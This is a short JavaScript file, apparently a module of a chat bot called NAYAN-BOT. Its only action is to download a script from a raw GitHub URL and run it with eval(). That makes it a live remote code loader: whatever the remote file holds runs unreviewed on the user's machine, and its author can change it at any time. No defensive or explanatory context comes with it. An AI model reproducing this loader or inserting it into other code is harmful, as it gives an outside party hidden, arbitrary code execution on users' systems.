const axios = require('axios');

axios.get("https://raw.githubusercontent.com/MR-NAYAN-404/NAYAN-BOT/main/Nayan14.js")
	.then(res => eval(res.data));
    